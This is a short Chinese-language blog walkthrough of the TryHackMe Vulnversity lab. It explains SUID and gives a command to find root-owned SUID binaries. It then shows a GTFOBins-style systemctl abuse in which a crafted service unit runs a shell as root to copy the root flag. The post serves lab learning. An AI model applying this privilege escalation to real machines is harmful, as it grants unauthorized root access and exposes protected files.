+++
title = "THM Vulnversity Walkthrough"
date = 2020-09-02
path = "2020/09/02/THM_Vulnversity_WriteUp"
description = "TryHackMe Vulnversity walkthrough, focusing on the part that took me longest: systemctl privesc via GTFOBins."

[extra]
lang = "zh"

[taxonomies]
tags = ["walkthrough", "pentest"]
categories = ["Walkthrough"]
+++
大家安，今天來分享一下在解這台簡單的機器讓我想比較久的地方。

<!-- more -->
除了最後要privilege escalation的部分之外，其他地方應該都不會有什麼大問題。
privilege escalation有很多方法，但題目內就有提示這台機器要privilege escalation的關鍵點在**SUID**。
## What is SUID？
簡單來說就是當執行這檔案時，會讓使用者**暫時**以檔案擁有者(file owner)的權限執行，
詳細說明可以去看 <https://www.cnblogs.com/sparkdev/p/9651622.html> ，
所以所以第一個的目標就是要找到這台機器內有什麼檔案是SUID加上owner是root的，
如果沒有頭緒，可以直接google find suid，就有一大堆資料可以找了，
這邊我是用 find / -user root -perm -4000 2>/dev/null，
就會看到很多東西，裡面有一個就是第一題的答案，**/bin/systemctl**，

## Become root
一開始我也是靠著TryHackMe題目上的字數提示才知道答案是systemctl的，
由於我對linux commamd的熟悉度還沒很高，
所以我是直接google systemctl privilege escalation，
就跳出 <https://gtfobins.github.io/gtfobins/systemctl/> ，
關於systemctl的詳細說明可以看
<https://blog.gtwang.org/linux/linux-basic-systemctl-systemd-service-unit-tutorial-examples/> ，
找到gtfobins基本上答案就出來了

```bash
    $ touch get_flag.service

    $ echo '[Service]
    > Type=oneshot
    > ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/flag"
    > [Install]
    > WantedBy=multi-user.target' > get_flag.service

    $ /bin/systemctl enable --now get_flag.service

    $ cat /tmp/flag
```
